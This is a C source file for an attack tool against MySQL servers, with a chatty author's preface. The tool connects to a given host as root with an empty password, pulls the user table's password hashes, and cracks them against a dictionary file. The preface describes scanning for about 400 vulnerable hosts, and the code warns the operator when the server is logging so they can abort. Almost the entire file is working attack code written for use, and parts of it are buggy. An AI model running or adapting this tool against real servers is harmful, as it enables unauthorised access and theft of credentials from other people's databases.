//mysqlfuck.c
/*--||MySQLfuck||--*/
/*Written by g0thm0g*/
/*-----------------*/
/*Earlier this summer (at least where I live), I had a
conversation with a friend.
It was one of those afternoons where you get an idea,
and it kinda sticks with you.
Anyway, our conversation involved a couple questions
about INSERT's into a MySQL
database.  Eventually, I told him that I would do it
for him.  I came over, sat down
on his computer, and accidentally typed his full IP
address in.  TO my surprise, the
host still connected.  Even worse, root login wasn't
passworded.  I figured that he
had mysql bound to 127.0.0.1, and that no real remote
host could connect.  However,
later that night after I had gone home, I got a phone
call from the friend asking me
to do it again.  Already on the computer (go figure
d:), I pulled up bash and
typed in his IP.  Right as I was about to ask him what
his password was, I noticed
that MySQL hadn't even bothered to authenticate me.  I
"used mysql" and then SELECT'ed
user,password,host FROM user.  To my horror, I recieved:
		 		 		 		 		 		 +------+----------+-----------+
		 		 		 		 		 		 | user | password | host      |
		 		 		 		 		 		 +------+----------+-----------+
		 		 		 		 		 		 | root |          | localhost |
		 		 		 		 		 		 | root |          | %         |
		 		 		 		 		 		 |      |          | localhost |
		 		 		 		 		 		 |      |          | %         |
		 		 		 		 		 		 +------+----------+-----------+
		 Not only was name-less login allowed, but root was
without password on localhost
and remote.  Anyway, to make a long story short, I did
some research, and found that
default Windows MySQL configuration lacks logging or
authentication.  I did some
network scanning, and I think I have around 400 hosts
with no root password.  Anyway,
to automate checking this, I wrote this program up.  It
tries to login as root/NULL,
then takes the values of the user password hashes and
tries to find a match to a
dictionary file called dictionary.txt.

I wrote up an advisory, which you'll probably see on
SecFoc soon.

If I had some cookies, I'd give them to:
		 -Tiefer and his relentless questioning and jokes about
my sister
		 -Club 21, especially for Hard Attack
		 -DJ Doboy, can't forget trancequility volume 19

(INSERT STANDARD "NOT-TO-BE-USED-FOR-ILLEGAL-USE"
CLAUSE HERE)
(INSERT STANDARD "I-HOLD-NO-LIABILITY" CLAUSE HERE)

Compile:
		 -MSVC= cl mysqlfuck.c libmySQL.lib /DWIN32 -O2
		 -GCC=  gcc -omysqlfuck mysqlfuck.c -lmySQL -O2

		 -Cheers
		 		 g0th
*/


#include <stdio.h>
#ifdef WIN32
#include <windows.h>
#endif
#include <mysql.h>

/*_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-*?
/*Crazy MySQL programmers and their short typedefs*/
/*-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-*/

#ifndef ulong
#define ulong unsigned long
#endif

#ifndef uint
#define uint unsigned int
#endif

#ifndef uchar
#define uchar unsigned char
#endif

/*_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-*?
/*##--####--####--####--####--####--####--####--##*/
/*-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-*/

/*--------------------------------------------------------------*/
/*<<<<This section is ripped straight from the MySQL
source.>>>>*/
/*I have this all nice and optimized in assembly on my
end, but*/
/*writing cross-compiler inline is not too fun, and
requring an*/
/*assembler is kinda frustrating.*/
/*--------------------------------------------------------------*/
void hash_password(ulong *result, const char *password)
{
  register ulong nr=1345345333L, add=7, nr2=0x12345671L;
  ulong tmp;
  for (; *password ; password++)
  {
    if (*password == ' ' || *password == '\t')
      continue;		 		 		 /* skipp space in password */

    tmp= (ulong) (uchar) *password;
    nr^= (((nr & 63)+add)*tmp)+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=tmp;
  }

  result[0]=nr & 2147483647; /* Don't use sign bit
(str2int) */;
  result[1]=nr2 & 2147483647;
  return;
}

void make_scrambled_password(char *to,const char *password)
{
  ulong hash_res[2];
  hash_password(hash_res,password);
  sprintf(to,"%08lx%08lx",hash_res[0],hash_res[1]);
}
/*--------------------------------------------------------------*/
/*<<<<######################################################>>>>*/
/*--------------------------------------------------------------*/


/*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*/


/*--------------------------------*/
/*<<<user struct to store data>>>>*/
/*--------------------------------*/
typedef struct
{
		 char *user;
		 char *password;
} user;

#define		 MAX_USERS		 16
/*--------------------------------*/
/*<<<<########################>>>>*/
/*--------------------------------*/



//main - for "coherency's" (yes, i mean laziness) sake,
i've kept this a single function
int
		 main
		 (
		 		 int argc,
		 		 char** argv
		 )
		 {

		 		 MYSQL * mysqlData;		 		 		 //--|-
		 		 MYSQL_RES * mysqlResult;		 //--|-MySQL Datatypes
		 		 MYSQL_ROW mysqlRow;		 		 		 //--|-

		 		 char *spHost;		 		 		 		 //--|
		 		 char *spUser="root";		 		 		 //--|
		 		 char *spPassword=NULL;		 		 //--|-Our connection data
		 		 int spPort=3306;		 		 		 //--|
		 		 char *spServerVersion;		 		 //--|

		 		 int usernum=0;		 		 		 		 //--|
		 		 user *users[MAX_USERS];		 		 //--|-User name/hash storage
data

		 		 FILE *fin, *fout;		 		 		 //--|
		 		 char *file_name;		 		 		 //--|-File I/O data

		 		 char *line=(char *)malloc(64);		 //--|
		 		 char *buff=(char *)malloc(64);		 //--|-Miscellaneous
buffers

		 		 int i=0;		 		 		 		 		 //--|Counter


		 		 //Warn about not meeting minimal arguments
		 		 if (2>argc)
		 		 {
		 		 		 fprintf (stderr, "usage: mysqlfuck host [-p<port>]");
		 		 		 return -1;
		 		 }

		 		 //Copy the first argument into the host buffer
		 		 spHost=(char *)malloc(sizeof(argv[1]));
		 		 strcpy (spHost, argv[1]);

		 		 //Copy port if the user specified
		 		 if (argv[2])
		 		 {
		 		 		 if (argv[2][1]=='p')
		 		 		 {
		 		 		 		 ++argv[2];
		 		 		 		 ++argv[2];
		 		 		 		 spPort=atoi(argv[2]);
		 		 		 		 printf ("port: %i\n", spPort);
		 		 		 }
		 		 }

		 		 //Initialize MySQL data and connect with root/NULL

		 		 mysqlData = (MYSQL *)malloc(sizeof(MYSQL));

		 		 mysql_init (mysqlData);

		 		 if (! mysql_real_connect (mysqlData, spHost, spUser,
spPassword, "mysql", spPort, NULL, 0) )
		 		 {
		 		 		 fprintf (stderr, "mysql_real_connect: %s\n",
mysql_error (mysqlData));
		 		 		 return -1;
		 		 }

		 		 //If the server logs, inform the user!

		 		 printf ("server version: %s\n",
mysql_get_server_info(mysqlData));

		 		 if (strstr (mysql_get_server_info (mysqlData), "log"))
		 		 {
		 		 		 printf ("Warning!  Server is logging - Continue(*/n)?");
		 		 		 if (getchar()=='n')
		 		 		 {
		 		 		 		 mysql_close (mysqlData);
		 		 		 		 return -1;
		 		 		 }
		 		 }

		 		 //"Obtain" the hashes (notice i didn't use the word
steal)

		 		 if ( mysql_query (mysqlData, "SELECT user,password
FROM user") )
		 		 {
		 		 		 fprintf (stderr, "mysql_query: %s\n", mysql_error
(mysqlData));
		 		 		 return -1;
		 		 }

		 		 //Store the result and process it

		 		 mysqlResult=mysql_store_result(mysqlData);
		 		 while (mysqlRow=mysql_fetch_row(mysqlResult))
		 		 {
		 		 		 if (strlen(mysqlRow[0])==0)
		 		 		 {
		 		 		 		 mysqlRow[0]="(NULL)";
		 		 		 }

		 		 		 if (strlen(mysqlRow[1])==0)
		 		 		 {
		 		 		 		 mysqlRow[1]="(NULL)";
		 		 		 }


		 		 		 users[usernum]=(user *)malloc(sizeof(user));
		 		 		 users[usernum]->user=(char
*)malloc(strlen(mysqlRow[0])+1);
		 		 		 strcpy (users[usernum]->user, mysqlRow[0]);
		 		 		 users[usernum]->password=(char
*)malloc(strlen(mysqlRow[1])+1);
		 		 		 strcpy (users[usernum]->password, mysqlRow[1]);
		 		 		 usernum++;
		 		 }

		 		 mysql_close (mysqlData);

		 		 //Setup putput file name string

		 		 file_name=(char *)malloc (sizeof(spHost)+4);
		 		 strcpy (file_name, spHost);
		 		 strcat (file_name, ".txt\0\0");
		 		 printf ("\n+----------------------------+\n");
		 		 printf ("<decrypting and dumping to %s>\n", file_name);
		 		 printf ("+----------------------------+\n");


		 		 fout=fopen (spHost, "w");

		 		 if (!fout)
		 		 {
		 		 		 fprintf (stderr, "Unable to open %s for password
dumping\n", spHost);
		 		 		 return -1;
		 		 }


		 		 //Use a database to crack the hashes (optional)
		 		 fin=fopen ("dictionary.txt", "r");
		 		 if (!fin)
		 		 {
		 		 		 fprintf (stderr, "error opening dictionary.txt - no
decryption will take place\n");

		 		 		 for (i=0;i<usernum;i++)
		 		 		 {
		 		 		 		 printf ("%s::%s\n", users[i]->user,
users[i]->password);
		 		 		 }

		 		 		 return -1;
		 		 }

		 		 //Loop through the user array and crack/output hashes
		 		 for (i=0;i<usernum;i++)
		 		 {
		 		 		 if (users[i]->user)
		 		 		 {
		 		 		 		 if (users[i]->password)
		 		 		 		 {

		 		 		 		 		 while ( (fgets (line, 63, fin)))
		 		 		 		 		 {
		 		 		 		 		 		 line[strlen(line)-1]='\0';
		 		 		 		 		 		 make_scrambled_password (buff, line);
		 		 		 		 		 		 if (strcmp (buff, users[i]->password)==0)
		 		 		 		 		 		 {
		 		 		 		 		 		 		 users[i]->password=line;
		 		 		 		 		 		 		 break;
		 		 		 		 		 		 }
		 		 		 		 		 }

		 		 		 		 		 fclose (fin);

		 		 		 		 		 fprintf (fout, "%s::%s\n", users[i]->user,
users[i]->password);
		 		 		 		 		 printf ("%s::%s\n", users[i]->user,
users[i]->password);
		 		 		 		 		 fflush (fout);
		 		 		 		 }
		 		 		 }
		 		 }

		 		 //Always clean up after yourself!

		 		 fclose (fout);

		 		 if (buff)
		 		 		 free (buff);

		 		 if (line)
		 		 		 free (line);

		 		 if (spHost)
		 		 		 free (spHost);

		 		 if (users)
		 		 		 free (users);

		 		 if (file_name)
		 		 		 free (file_name);

		 		 if (mysqlData)
		 		 		 free (mysqlData);

		 }



